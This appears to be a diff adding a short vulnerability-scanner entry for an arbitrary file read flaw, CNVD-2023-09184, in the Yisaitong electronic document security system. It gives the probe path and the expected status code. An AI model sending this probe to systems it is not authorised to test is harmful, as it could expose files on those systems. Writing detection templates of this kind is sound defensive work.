@@ -1,0 +1,3 @@
+name: "亿赛通电子文档安全管理系统任意文件读取CNVD-2023-09184"
+poc: "/solr/flow/debug/dump"
+status_code: 200
